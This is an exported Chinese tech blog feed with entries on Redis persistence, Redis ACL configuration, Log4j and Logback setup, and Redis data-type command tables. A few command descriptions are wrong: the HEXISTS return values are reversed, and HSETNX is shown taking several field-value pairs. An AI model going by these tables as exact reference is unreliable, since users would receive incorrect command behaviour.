RDB和AOF混合方式（4.0版本)

Redis 4.0 中提出了一个混合使用 AOF 日志和内存快照的方法。简单来说，内存快照以一定的频率执行，在两次快照之间，使用 AOF 日志记录这期间的所有命令操作。

这样一来，快照不用很频繁地执行，这就避免了频繁 fork 对主线程的影响。而且，AOF 日志也只用记录两次快照间的操作，也就是说，不需要记录所有操作了，因此，就不会出现文件过大的情况了，也可以避免重写开销。
如下图所示，T1 和 T2 时刻的修改，用 AOF 日志记录，等到第二次做全量快照时，就可以清空 AOF 日志，因为此时的修改都已经记录到快照中了，恢复时就不再用日志了。

这个方法既能享受到 RDB 文件快速恢复的好处，又能享受到 AOF 只记录操作命令的简单优势, 实际环境中用的很多
从持久化中恢复数据

数据的备份、持久化做完了，我们如何从这些持久化文件中恢复数据呢？如果一台服务器上有既有RDB文件，又有AOF文件，该加载谁呢？

其实想要从这些文件中恢复数据，只需要重新启动Redis即可。我们还是通过图来了解这个流程：


redis重启时判断是否开启aof，如果开启了aof，那么就优先加载aof文件；
如果aof存在，那么就去加载aof文件，加载成功的话redis重启成功，如果aof文件加载失败，那么会打印日志表示启动失败，此时可以去修复aof文件后重新启动；
若aof文件不存在，那么redis就会转而去加载rdb文件，如果rdb文件不存在，redis直接启动成功；
如果rdb文件存在就会去加载rdb文件恢复数据，如加载失败则打印日志提示启动失败，如加载成功，那么redis重启成功，且使用rdb文件恢复数据；

那么为什么会优先加载AOF呢？因为AOF保存的数据更完整，通过上面的分析我们知道AOF基本上最多损失1s的数据。
性能与实践
通过上面的分析，我们都知道RDB的快照、AOF的重写都需要fork，这是一个重量级操作，会对Redis造成阻塞。因此为了不影响Redis主进程响应，我们需要尽可能降低阻塞。

降低fork的频率，比如可以手动来触发RDB生成快照、与AOF重写；
控制Redis最大使用内存，防止fork耗时过长；
使用更牛逼的硬件；
合理配置Linux的内存分配策略，避免因为物理内存不足导致fork失败。

在线上我们到底该怎么做？我提供一些自己的实践经验。

如果Redis中的数据并不是特别敏感或者可以通过其它方式重写生成数据，可以关闭持久化，如果丢失数据可以通过其它途径补回；
自己制定策略定期检查Redis的情况，然后可以手动触发备份、重写数据；
单机如果部署多个实例，要防止多个机器同时运行持久化、重写操作，防止出现内存、CPU、IO资源竞争，让持久化变为串行；
可以加入主从机器，利用一台从机器进行备份处理，其它机器正常响应客户端的命令；
RDB持久化与AOF持久化可以同时存在，配合使用。

]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-ACL</title>
    <url>/20230210/4be8fe93.html</url>
    <content><![CDATA[前言
在 Redis6.0中引入了ACL（Access Control List) 的支持，可以给每个用户分配不同的权限来控制权限。
Redis AUTH命令在Redis 6中进行了扩展，所以现在可以以双参数形式使用它:
AUTH &lt;username&gt; &lt;password&gt;
这里有一个旧形式的例子
AUTH &lt;password&gt;
所发生的情况是，用于身份验证的用户名是“default”，因此仅指定密码就意味着我们希望根据默认用户进行身份验证。这提供了向后兼容性。
如果该用户具有 nopass规则，那么新的连接将立即作为“默认”用户进行身份验证，而不需要通过AUTH命令提供任何密码。
如果“默认”用户没有标记为nopass，则连接将在未验证的状态下启动，并将需要AUTH(或HELLO命令AUTH选项)才能进行身份验证并开始工作。
使用场景

您希望通过限制对命令和密钥的访问来提高安全性，这样不受信任的客户机就没有访问权限，而受信任的客户机只有执行所需工作所需的最低级别的数据库访问权限。例如，某些客户端可能只能执行只读命令。
您希望提高操作安全性，以便访问Redis的进程或人员不允许由于软件错误或手动错误而损坏数据或配置。例如，从Redis获取延迟作业的worker没有理由能够调用FLUSHALL命令。

配置ACL
Redis ACL用户的定义格式如下: user &lt;username&gt; ... acl rules ... 如 worker +@list +@connection ~jobs:* on &gt;ffa9203c493aa99
默认情况下，只定义了一个名为default的用户。我们可以使用ACL LIST命令来检查当前活动的ACL，并验证一个新启动的、默认配置的Redis实例的配置是什么:
&gt; ACL LIST1) "user default on nopass ~* &amp;* +@all"
每行的前两个单词是“user”，后面跟着用户名。下一个单词是描述不同事物的ACL规则。我们将详细说明这些规则是如何工作的，但现在只需要说明默认用户被配置为活动(on)，不需要密码(nopass)，可以访问每个可能的密钥(~)和发布/订阅通道(&amp;)，并且能够调用每个可能的命令(+@all)。
此外，在默认用户的特殊情况下，使用nopass规则意味着新连接将自动使用默认用户进行身份验证，而不需要任何显式的AUTH调用。
&gt; ACL SETUSER aliceOK&gt; ACL LIST1) "user alice off resetchannels -@all"2) "user default on nopass ~* &amp;* +@all"# 这样的用户完全没用。让我们尝试定义用户，使其处于活动状态，具有密码，并且只能使用GET命令访问以字符串“cached:”开头的键名。&gt; ACL SETUSER alice on &gt;p1pp0 ~cached:* +getOK&gt; AUTH alice p1pp0OK&gt; GET foo(error) NOPERM this user has no permissions to access one of the keys used as arguments&gt; GET cached:1234(nil)&gt; SET cached:1234 zap(error) NOPERM this user has no permissions to run the 'set' command# ACL GETUSER 是 ACL LIST的替代方案，方便阅读&gt; ACL GETUSER alice1) "flags"2) 1) "on"3) "passwords"4) 1) "2d9c75..."5) "commands"6) "-@all +get"7) "keys"8) "~cached:*"9) "channels"10) ""11) "selectors"12) (empty array)# 使用另一个ACL SETUSER命令(来自不同的用户，因为alice不能运行ACL命令)，我们可以向用户添加多个模式:&gt; ACL SETUSER alice ~objects:* ~items:* ~public:*OK&gt; ACL LIST1) "user alice on #2d9c75... ~cached:* ~objects:* ~items:* ~public:* resetchannels -@all +get"2) "user default on nopass ~* &amp;* +@all"
ACL规则
ACL规则可以以任意顺序指定：例如，可以从密码开始，然后是标志或密钥模式。但是请注意，加法和减法规则将根据顺序改变含义。
# 例如，请看下面的例子:##   user alice on +@all -DEBUG ~* &gt;somepassword## 这将允许“alice”使用除DEBUG命令之外的所有命令,因为 +@all将所有命令添加到alice可以使用的命令集，后来DEBUG被删除。# 然而，如果我们颠倒两个ACL规则的顺序，结果将是不同的:##   user alice on -DEBUG +@all ~* &gt;somepassword## 现在，当alice在允许的命令集中还没有命令时，DEBUG被删除，之后所有的命令都被添加，所以用户将能够执行所有的命令。
基本上ACL规则是从左到右处理的。
下面是有效的ACL规则列表。某些规则只是单个单词，用于激活或删除标志，或执行对用户ACL的给定更改。其他规则是与命令或类别名称、键模式等连接在一起的字符前缀。


启用和禁用用户



参数
说明




on
启用用户：可以作为该用户进行身份验证。


off
禁止该用户：不再可能对该用户进行身份验证；但是，以前经过身份验证的连接仍然可以工作。注意，如果默认用户被标记为关闭，那么新的连接将作为未验证启动，并且将要求用户发送带有AUTH选项的AUTH或HELLO，以便以某种方式进行身份验证，而不管默认用户配置如何。









allow和disallow命令



参数
说明





|+ | 将该命令添加到用户可以调用的命令列表中。可以与|一起使用以允许子命令（例如+config|get)。 |
| - | 将该命令移到用户可以调用的命令列表中。从Redis 7.0开始，它可以与|一起用于阻塞子命令（例如+config|get)。 |
| +@ | 添加该类别中所有用户调用的命令，有效类别为@admin， @set， @sortedset，…诸如此类， ACL CAT 命令查看完整的列表。特殊类别@all表示所有命令，包括当前存在于服务器中的命令，以及将来将通过模块加载的命令。 |
| -@ | 类似 +@&lt;category&gt; 但是从客户端可以调用的命令列表中删除命令。 |
| +|first-arg（弃用） | 允许在其他情况下禁用命令的特定第一个参数它只支持没有子命令的命令，并且不允许作为-SELECT|1这样的负形式，只支持以+开头的加法。 |
| allcommands |  +@all另外一种书写形式.  注意，它意味着能够执行通过模块系统加载的所有未来命令。 |
| nocommands |  -@all另外一种书写形式 |


允许和禁止某些密钥和密钥权限



参数
说明




~
可以作为命令的一部分, 添加一个键的模式 例如~* 允许所有的键 。该模式是一个全局样式的模式，类似于KEYS的模式。可以指定多个模式。


%R~
(版本7.0之后)  添加键读取模式，指定可以从哪些键读取。它的行为类似于常规键模式，但只授予从匹配给定模式的键读取的权限. 有关更多信息，请参阅关键权限。


%W~
(版本7.0之后)  添加指定的写键模式。指定可以写入哪些键。它的行为类似于常规键模式，但只授予写入匹配给定模式的键的权限。有关更多信息，请参阅关键权限。


%RW~
(版本7.0之后)  ~&lt;pattern&gt;另外一种书写形式


allkeys
~*另外一种书写形式


resetkeys
刷新允许的键模式列表。 例如ACL ~foo:* ~bar:* resetkeys ~objects:*，将只允许客户端访问匹配模式objects:*的键。





允许和禁止发布/订阅频道:



参数
说明




&amp;
(版本6.2之后) 添加用户可以访问的 Pub/Sub 通道的全局样式模式。可以指定多个通道模式。注意：模式匹配只对PUBLISH和SUBSCRIBE提到的通道进行, 而PSUBSCRIBE要求它的通道模式和用户允许的通道模式之间的文字匹配


allchannels
&amp;*另外一种书写形式，允许用户访问所有Pub/Sub通道。


resetchannels
刷新允许的通道模式列表，如果用户的发布/订阅客户端不再能够访问各自的通道 和/或 通道模式，则断开这些客户端。





为用户配置有效密码
如果一个用户没有标记为nopass，并且没有有效密码列表，那么该用户实际上是不可能使用的，因为无法以该用户身份登录



参数
说明




&gt;
将此密码添加到用户的有效密码列表中。例如，&gt;mypass会将mypass添加到有效密码列表中。该指令清除nopass标志(参见后面的内容)。每个用户可以有任意数量的密码。


&lt;
从有效密码列表中删除此密码。如果您试图删除的密码实际上没有设置，则会发出一个错误。


#
将此SHA-256哈希值添加到用户的有效密码列表中。此哈希值将与为ACL用户输入的密码的哈希值进行比较。这允许用户在acl.conf文件中存储哈希值，而不是存储明文密码。只有SHA-256哈希值被接受，因为密码哈希值必须是64个字符，并且只包含小写的十六进制字符。


!
从有效密码列表中删除此散列值。当您不知道由哈希值指定的密码，但希望从用户中删除密码时，这很有用。


nopass
该用户设置的所有密码都被删除，并且该用户被标记为不需要密码：这意味着每个密码都适用于该用户。如果此指令用于默认用户default，则每个新连接将立即使用默认用户进行身份验证，而不需要任何显式的AUTH命令。注意，resetpass 指令将清除此条件。


resetpass
清除允许的密码列表并删除nopass状态。在resetpass之后，用户没有关联的密码，如果不添加一些密码（或者稍后将其设置为nopass）就无法进行身份验证。





为用户配置选择器



参数
说明




()
(版本7.0之后) 创建一个新的选择器来匹配规则。用括号中指定的选项创建一个新的选择器，并将其附加到用户。每个选项应该用空格隔开。第一个字符必须是(最后一个字符必须是)选择器在用户权限之后计算，并根据它们定义的顺序计算。如果一个命令匹配用户权限或任何选择器，它就被允许。去 selectors 查看更多信息


clearselectors
(版本7.0之后) 删除所有附加到用户的选择器









重置用户:



参数
说明




reset
执行以下操作:resetpass, resetkeys, resetchannels, allchannels(如果设置了acl-pubsub-default)， off, clearselectors， -@all用户将返回到创建后立即具有的相同状态。





命令分类



参数
说明




admin
管理命令。普通应用程序永远不需要使用这些. Includes REPLICAOF, CONFIG, DEBUG, SAVE, MONITOR, ACL, SHUTDOWN, etc.


blocking
可能阻塞连接，直到另一个命令释放


connection
影响连接或其他连接的命令. 包含 AUTH, SELECT, COMMAND, CLIENT, ECHO, PING, 等


dangerous
有潜在危险(由于各种原因，每一种都应谨慎考虑). 包含 FLUSHALL, MIGRATE, RESTORE, SORT, KEYS, CLIENT, DEBUG, INFO, CONFIG, SAVE, REPLICAOF, 等


fast
Fast O(1) 命令. 可以循环参数的数量，但不是键中的元素数量。


keyspace
以类型不可知的方式从键、数据库或其元数据中写入或读取。包括DEL, RESTORE, DUMP, RENAME, EXISTS, DBSIZE, KEYS, EXPIRE, TTL, FLUSHALL等。可能修改键空间、键或元数据的命令也将有写类别只读取键空间、键或元数据的命令将具有read类别


pubsub
PubSub相关命令


read
从键(值或元数据)读取。注意，不与键交互的命令既不能读也不能写。


scripting
Scripting相关命令


slow
所有不是快速的命令.


transaction
WATCH / MULTI / EXEC 相关命令


write
写入键(值或元数据)。


bitmap
Data type: bitmaps related.


set
Data type: sets related.


sortedset
Data type: sorted sets related.


geo
Data type: geospatial indexes related.


hash
Data type: hashes related.


hyperloglog
Data type: hyperloglog related.


stream
Data type: streams related.


string
Data type: strings related.


list
Data type: lists related.



有关ACL配置的更多信息，请参见 https://redis.io/topics/acl
]]></content>
      <categories>
        <category>数据库</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Log4j日常使用记录</title>
    <url>/20230511/14631848.html</url>
    <content><![CDATA[log4j.properties 配置说明
log4J 日志信息log4j.properties配置说明##logger是进行记录的主要类，appender是记录的方式,layout是记录的格式#Logger 日志写出器，供程序员输出日志信息#Appender 日志目的地，把格式化好的日志信息输出到指定的地方去#ConsoleAppender 目的地为控制台的Appender#FileAppender 目的地为文件的Appender#RollingFileAppender 目的地为大小受限的文件的Appender#Layout 日志格式化器，用来把程序员的logging request格式化成字符串#PatternLayout 用指定的pattern格式化logging request的Layou#Log4j提供的appender有以下几种：#　　org.apache.log4j.ConsoleAppender（控制台），#　　org.apache.log4j.FileAppender（文件），#　　org.apache.log4j.DailyRollingFileAppender（每天产生一个日志文件），#　　org.apache.log4j.RollingFileAppender（文件大小到达指定尺寸的时候产生一个新的文件），#　　org.apache.log4j.WriterAppender（将日志信息以流格式发送到任意指定的地方）#Log4j提供的layout有以下几种：#　　org.apache.log4j.HTMLLayout（以HTML表格形式布局），#　　org.apache.log4j.PatternLayout（可以灵活地指定布局模式），#　　org.apache.log4j.SimpleLayout（包含日志信息的级别和信息字符串），#　　org.apache.log4j.TTCCLayout（包含日志产生的时间、线程、类别等等信息）#Log4J采用类似C语言中的printf函数的打印格式格式化日志信息，打印参数如下# %m 输出代码中指定的消息# %M 输出日志发生的方法名#　　%p 输出优先级，即DEBUG，INFO，WARN，ERROR，FATAL#　　%r 输出自应用启动到输出该log信息耗费的毫秒数#　　%c 输出所属的类目，通常就是所在类的全名#　　%t 输出产生该日志事件的线程名#　　%n 输出一个回车换行符，Windows平台为“rn”，Unix平台为“n”#　　%d 输出日志时间点的日期或时间，默认格式为ISO8601，也可以在其后指定格式，比如：%d{yyyy MMM dd HH:mm:ss,SSS}，输出类似：2002年10月18日 22：10：28，921#　　%l 输出日志事件的发生位置，包括类目名、发生的线程，以及在代码中的行数。举例：Testlog4.main(TestLog4.java:10)# %L 输出日志发生的位置# %F 输出类名######################################################################设置级别和目的地 -- 把日志等级为debug的日志信息输出到stdout和SYS,QUERY这三个目的地log4j.rootLogger=debug,STDOUT# stdout:目的地 -- 打印到屏幕## org.apache.log4j.ConsoleAppender:控制台log4j.appender.STDOUT=org.apache.log4j.ConsoleAppender## org.apache.log4j.PatternLayout:灵活地指定布局模式log4j.appender.STDOUT.layout=org.apache.log4j.PatternLayout## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%c-%M] %m%n [%-5p][%d{HH:mm:ss}][%l] %m%nlog4j.appender.STDOUT.layout.ConversionPattern=[%-5p][%d{yyyy-MM-dd HH:mm:ss sss}][%t][%c-%M][%L](%F:%L) - %m%n# QUERY:目的地 -- 输出到文件(限定每个文件大小)## 凡是 info、warn、error、fatal 级别的数据都会在这里执行输出到 query.log 日志文件中##log4j.logger.QUERY=INFO,QUERYlog4j.logger.QUERY=INFO##输出到文件(这里默认为追加方式)，使用org.apache.log4j.FileAppender：日志会在一个文件中追加log4j.appender.QUERY=org.apache.log4j.RollingFileAppender##设置文件输出路径;html:log/query.htmllog4j.appender.QUERY.File=log/query.log##设置文件输出样式;html格式： org.apache.log4j.HTMLLayoutlog4j.appender.QUERY.layout=org.apache.log4j.PatternLayout## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%l] %m%nlog4j.appender.QUERY.layout.ConversionPattern=[%-5p][%d{yyyy-MM-dd HH:mm:ss}][%c-%M] %m%n## 指定文件的最大 大小log4j.appender.QUERY.MaxFileSize=2048KB## 可被备份的日志数log4j.appender.QUERY.MaxBackupIndex=100# SYS:目的地 -- 输出到文件(每天产生一个文件)## 凡是 error、fatal 级别的数据都会在这里执行输出到 sys.log 日志文件中#log4j.logger.SYS=error,SYSlog4j.logger.SYS=error## org.apache.log4j.RollingFileAppender:每天产生一个日志文件#使用org.apache.log4j.FileAppender：日志会在一个文件中追加log4j.appender.SYS=org.apache.log4j.DailyRollingFileAppender##设置文件输出路径 ${user.home}/log/sys.loglog4j.appender.SYS.File=log/sys.log## org.apache.log4j.PatternLayout:灵活地指定布局模式log4j.appender.SYS.layout=org.apache.log4j.PatternLayout## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%l] %m%nlog4j.appender.SYS.layout.ConversionPattern=[%-5p][%d{HH:mm:ss}][%C-%M] %m%n#设置特定包的级别## 把com.swh.weixin包下的日志内容显示级别为debug,和目的地## 把com.swh.weixin.util包下日志等级为debug的信息输出到pack 目的地#log4j.logger.com.swh.weixin.util=debug,pack##输出到文件(这里默认为追加方式)，使用org.apache.log4j.FileAppender：日志会在一个文件中追加log4j.appender.pack=org.apache.log4j.RollingFileAppender##设置文件输出路径 或者 ${user.home}/log/pack.loglog4j.appender.pack.File=log/pack.log##设置文件输出样式log4j.appender.pack.layout=org.apache.log4j.PatternLayout## 上一句设置了PatternLayout灵活指定格式，则要指定打印参数 [%-5p][%d{HH:mm:ss}][%l] %m%nlog4j.appender.pack.layout.ConversionPattern=[%-5p][%d{yyyy MM dd HH:mm:ss}][%c-%M] %m%n## 指定文件的最大 大小log4j.appender.pack.MaxFileSize=1024KB#日志最大备份数目log4j.appender.pack.MaxBackupIndex=100##########################################################################设置级别和目的地#log4j.rootLogger=debug,appender1,appender2##只设置特定包的级别和目的地#log4j.logger.com.coderdream=debug,appender1#log4j.logger.com.coderdream.Dao=info,appender1,appender2##输出到控制台#log4j.appender.appender1=org.apache.log4j.ConsoleAppender##设置输出样式#log4j.appender.appender1.layout=org.apache.log4j.PatternLayout##自定义样式## %r 时间 0## %t 方法名 main## %p 优先级 DEBUG/INFO/ERROR## %c 所属类的全名(包括包名)## %l 发生的位置，在某个类的某行## %m 输出代码中指定的讯息，如log(message)中的message## %n 输出一个换行符号#log4j.appender.appender1.layout.ConversionPattern=[%d{yy/MM/dd HH:mm:ss:SSS}][%C-%M] %m%n##输出到文件(这里默认为追加方式)#log4j.appender.appender2=org.apache.log4j.FileAppender##设置文件输出路径##【1】文本文件#log4j.appender.appender2.File=c:/Log4JCRM_Dao.log##设置文件输出样式#log4j.appender.appender2.layout=org.apache.log4j.PatternLayout#log4j.appender.appender2.layout.ConversionPattern=[%d{HH:mm:ss:SSS}][%C-%M] -%m%n##把日志文件写入数据库##########################日志输出到远程数据库##########################################把日志文件写入数据库##记录的日志级别log4j.logger.db=info##日志输出到数据库log4j.appender.db = org.apache.log4j.jdbc.JDBCAppender##缓存log4j.appender.db.BufferSize = 0##数据库驱动log4j.appender.db.Driver = com.mysql.jdbc.Driver##数据url地址 ，本地可简写：jdbc:mysql:///testlog4j.appender.db.URL = jdbc:mysql://localhost:3306/swh_hibernate4?useUnicode=true&amp;characterEncoding=utf8##数据库用户名log4j.appender.db.User = root##数据库密码log4j.appender.db.Password = root##日志布局模式log4j.appender.db.layout = org.apache.log4j.PatternLayout##日志插入数据库中，t_logs 表字段可自定义log4j.appender.db.layout.ConversionPattern = INSERT INTO t_logs(createDate, thread, priority, category,&lt;br /&gt; methodName, message) values('%d', '%t', '%-5p', '%c','%M', '[%l]-%m')
打印SQL语句
log4j.logger.java.sql.Connection=DEBUGlog4j.logger.java.sql.Statement=DEBUGlog4j.logger.java.sql.PreparedStatement=DEBUGlog4j.logger.java.sql.ResultSet=DEBUG
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Log4j</category>
      </categories>
      <tags>
        <tag>Log4j</tag>
      </tags>
  </entry>
  <entry>
    <title>Logback日常使用记录</title>
    <url>/20221030/4b5ef04d.html</url>
    <content><![CDATA[Logback 配置Demo
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;configuration&gt;   &lt;appender name="consoleLog" class="ch.qos.logback.core.ConsoleAppender"&gt;     &lt;layout class="ch.qos.logback.classic.PatternLayout"&gt;       &lt;pattern&gt;%d - %msg%n&lt;/pattern&gt;     &lt;/layout&gt;   &lt;/appender&gt;    &lt;appender name="fileInfoLog" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt;     &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt;       &lt;level&gt;ERROR&lt;/level&gt;        &lt;onMatch&gt;DENY&lt;/onMatch&gt;        &lt;onMismatch&gt;ACCEPT&lt;/onMismatch&gt;     &lt;/filter&gt;      &lt;encoder&gt;       &lt;pattern&gt;%d - %msg%n&lt;/pattern&gt;     &lt;/encoder&gt;      &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt;       &lt;fileNamePattern&gt;C:\Users\hots_\Downloads\info.%d.log&lt;/fileNamePattern&gt;     &lt;/rollingPolicy&gt;   &lt;/appender&gt;    &lt;appender name="fileErrorLog" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt;     &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt;       &lt;level&gt;ERROR&lt;/level&gt;     &lt;/filter&gt;      &lt;encoder&gt;       &lt;pattern&gt;%d - %msg%n&lt;/pattern&gt;     &lt;/encoder&gt;      &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt;       &lt;fileNamePattern&gt;C:\Users\hots_\Downloads\error.%d.log&lt;/fileNamePattern&gt;     &lt;/rollingPolicy&gt;   &lt;/appender&gt;    &lt;root level="info"&gt;     &lt;appender-ref ref="consoleLog"/&gt;      &lt;appender-ref ref="fileInfoLog"/&gt;      &lt;appender-ref ref="fileErrorLog"/&gt;   &lt;/root&gt; &lt;/configuration&gt;
]]></content>
      <categories>
        <category>框架|中间件</category>
        <category>Logback</category>
      </categories>
      <tags>
        <tag>Logback</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis-数据类型（基础）</title>
    <url>/20230103/72ab10c8.html</url>
    <content><![CDATA[String



命令
使用
功能
说明




SET
SET key value SET key value ex seconds
增
储值储值且key在指定秒后过期


MSET
MSET key value [key value …]
增
同时储多个值


SETEX
SETEX key seconds value
增
储值，且key在指定秒后过期


PSETEX
PSETEX key milliseconds value
增
储值，且key在指定毫秒后过期


SETNX
SETNX key value
增
仅在key不存在时执行


MSETNX
MSETNX key value [key value …]
增
在所有的key不存在时执行


SETRANGE
SETRANGE key offset value
改
字符串从offset开始由value替代


INCR
INCR key
改
key自增


DECR
DECR key
改
key自减


INCRBY
INCRBY key increment
改
key增加指定整形量


DECRBY
DECRBY key decrement
改
key减少指定整形量


INCRBYFLOAT
INCRBYFLOAT key increment
改
key增加指定浮点量，浮点数为负数则为减少


APPEND
APPEND key value
改
追加储值


GET
GET key
查
获取key的value


MGET
MGET key [key …]
查
同时获取多个key


GETDEL
GETDEL key
查&amp;删
获取key的value后删除key


GETSET
GETSET key value
查&amp;改
set新的value，并返回旧的value


GETRANGE
GETRANGE key start end
查
获取value的子字符串 （从start到end）


SUBSTR
SUBSTR key start end
查
获取value的子字符串 （从start到end）


STRLEN
STRLEN key
查
获取字符串长度




其他（6.0.6以下版本不支持）





发行版本
命令
功能
说明




GETEX
6.2.0
GETEX key [EX seconds |PX milliseconds |EXAT unix-time-seconds |PXAT unix-time-milliseconds |PERSIST]
查&amp;删
- EX seconds：指定过期秒数- PX milliseconds：指定过期毫秒数- EXAT timestamp-seconds：指定unix某时间点后多少秒过期- PXAT timestamp-milliseconds：指定unix某时间点后多少毫秒过期- PERSIST：删除过期时间


LCS
7.0.0
LCS key1 key2 [LEN] [IDX] [MINMATCHLEN len] [WITHMATCHLEN]
查
实现最长公共子序列算法。匹配是从最后一个key到第一个key产生的。[LEN]：最长匹配字符串长度[IDX]：返回一个数组。其中包含 LCS匹配结果长度、两个字符串匹配上的开始和结束偏移量[MINMATCHLEN len] ：最短匹配字符串长度[WITHMATCHLEN]：与IDX一起使用，返回最长公共子字符串的长度




详解



LCS key1 key2 [LEN] [IDX] [MINMATCHLEN len] [WITHMATCHLEN] （longest contain substring）
LCS 命令实现最长公共子序列算法。请注意，这与最长的常见字符串算法不同，因为字符串中的匹配字符不需要是连续的
&gt; MSET key1 ohmytext key2 mynewtextOK
a. 获取匹配结果
&gt; LCS key1 key2"mytext"
b. 有时我们只需要匹配的长度：LEN
&gt; LCS key1 key2 LEN"6"
c. 获取匹配的详细情况：IDX（LEN 和 IDX 不可同时存在）
&gt; LCS key1 key2 IDX1) "matches"2) 1) 1) 1) (integer) 4         2) (integer) 7      2) 1) (integer) 5         2) (integer) 8   2) 1) 1) (integer) 2         2) (integer) 3      2) 1) (integer) 0         2) (integer) 13) "len"4) (integer) 6
然而，通常非常有用的是知道每个字符串中的匹配位置：匹配是从最后一个到第一个产生的
上面的数组意味着第一个匹配项（数组的第二个元素）在第一个字符串的位置 2-3 和第二个字符串的 0-1 之间。然后是 4-7 和 5-8 之间。
要将匹配列表限制为给定最小长度的匹配列表：MINMATCHLEN 4
&gt; LCS key1 key2 IDX MINMATCHLEN 41) "matches"2) 1) 1) 1) (integer) 4         2) (integer) 7      2) 1) (integer) 5         2) (integer) 83) "len"4) (integer) 6
匹配列表展示匹配长度：WITHMATCHLEN
&gt; LCS key1 key2 IDX MINMATCHLEN 4 WITHMATCHLEN1) "matches"2) 1) 1) 1) (integer) 4         2) (integer) 7      2) 1) (integer) 5         2) (integer) 8      3) (integer) 43) "len"4) (integer) 6


如果没有修饰符，则返回表示最长公共子字符串的字符串。


当LEN给出命令返回最长公共子字符串的长度。


当IDX给出该命令时，返回一个数组。
len：包含 LCS匹配结果长度
matches：两个字符串匹配上的开始和结束偏移量。当WITHMATCHLEN给出每个表示匹配的数组时，也将具有匹配的长度




List
Redis 列表是字符串值的链表。
Redis 列表经常用于：

实现堆栈和队列。
为后台工作系统构建队列管理。

双向链表：LPUSH命令将一个新元素添加到列表的左侧（头部），而该RPUSH命令将一个新元素添加到列表的右侧（尾部）
使用列表的技巧

lpush+lpop = Stack(栈)
lpush+rpop = Queue（队列）
lpush+ltrim = Capped Collection（有限集合）
lpush+brpop = Message Queue（消息队列）




命令
使用
功能
说明




LPUSH
LPUSH key value [value …]
增



LPOP
LPOP key
删



LPUSHX
LPUSHX key value [value …]
增
当 key 不存在时不会进行任何操作


LSET
LSET key index value
改
修改指定位置元素


LINSERT
LINSERT key &lt;BEFORE |AFTER&gt; pivot element
查&amp;增
功能： 在参考值pivot 之前或之后，将元素插入存储在 key 处的列表中。-  当key不存在时，认为是空列表，不进行任何操作。 - 当key存在，但不包含值pivot 时返回错误。返回：  插入操作后列表的长度，或者当未找到值主元时为 -1。举例：LINSERT mylist BEFORE "World" "There"


LREM
LREM key count value
删
删除count个value。count 为负数，从列尾开始计算


LTRIM
LTRIM key start stop
删
截断列表元素，-1 是列表的最后一个元素


LRANGE
LRANGE key start stop
查
获取列表指定范围数据：偏移量为负数，表示从列表末尾开始的偏移量。 正整数（正数排名），负整数（倒数排名）例如，-1 是列表的最后一个元素，-2 是倒数第二个元素，依此类推。


LLEN
LLEN key
查
获取列表元素个数


LINDEX
LINDEX key index
查
获取列表第index个元素，-1 是列表的最后一个元素


LPOS
LPOS key element [RANK rank] [COUNT num-matches] [MAXLEN len]
查
查找列表元素（发布版本：6.0.6） [RANK rank] ： 指定要返回的第一个元素的“排名”，正整数（正数排名），负整数（倒数排名）。[COUNT num-matches]：总共返回 num-matches个目标元素[MAXLEN len]：最大筛查次数


BLPOP
BLPOP key [key …] timeout
删
它是 LPOP 的阻塞版本。 当没有任何元素可以从任何给定列表中弹出时，它会阻塞连接，直到超时后返回 null


RPUSH
RPUSH key value [value …]
增



RPUSHX
RPUSHX key value [value …]
增
当 key 不存在时不会进行任何操作


RPOP
RPOP key
删



RPOPLPUSH
RPOPLPUSH source destination
删
删除列表中的最后一个元素，将其添加到另一个列表并返回


BRPOP
BRPOP key [key …] timeout
删
它是 RPOP 的阻塞版本




其他（6.0.6以下版本不支持）




命令
使用
发行版本
说明




LMOVE
LMOVE source  destination LEFT |RIGHT   LEFT|RIGHT
6.2.0
从列表中弹出一个元素，将其推送到另一个列表并返


LMPOP
LMPOP numkeys key [key …] &lt;LEFT |RIGHT&gt; [COUNT count]
7.0.0
从提供的键名列表中的第一个非空列表键中弹出一个或多个元素。


BLMPOP
BLMPOP timeout numkeys key [key …] &lt;LEFT |RIGHT&gt; [COUNT count]
7.0.0
它是 LMPOP 的阻塞版本


BLMOVE
BLMOVE  source  destination &lt;LEFT |RIGHT&gt; &lt;LEFT |RIGHT&gt; timeout
6.2.0
它是 LMOVE 的阻塞版本



Hash
Redis 哈希是结构为字段值对集合的记录类型。您可以使用散列来表示基本对象并存储计数器分组等。



命令
使用
功能
说明




HEXISTS
HEXISTS key field
查
查询 key.field 是否存在，存在返回0，不存在返回1


HGET
HGET key field
查
获取指定键值对


HMGET
HMGET key field [field …]
查
获取多个字段值


HGETALL
HGETALL key
查
获取所有键值对数据


HINCRBY
HINCRBY key field increment
改
将hash 的 field字段的整数值增加给定的数字


HINCRBYFLOAT
HINCRBYFLOAT key field increment
改
将hash 的 field字段的浮点值增加给定的数量


HKEYS
HKEYS key
查
获取hash 中的所有key


HLEN
HLEN key
查
键值对个数


HSET
HSET key field value
增



HMSET
HMSET key field value [field value…]
增



HSETNX
HSETNX key field value [field value…]
增
如果 key field 都已存在时不会进行任何操作


HSTRLEN
HSTRLEN key field
查
获取 key.field的value的长度


HVALS
HVALS key
查
获取hash 中的所有value


HSCAN
HSCAN key cursor [MATCH pattern] [COUNT count]
查
使用方法方法可以参考SCAN


HDEL
HDEL key field [field …]
删
删除一个或者多个Hash表的键值对




其他（6.0.6以下版本不支持）




命令
发行版本
使用
功能
说明




HRANDFIELD
6.2.0
HRANDFIELD key [count [WITHVALUES]]
查
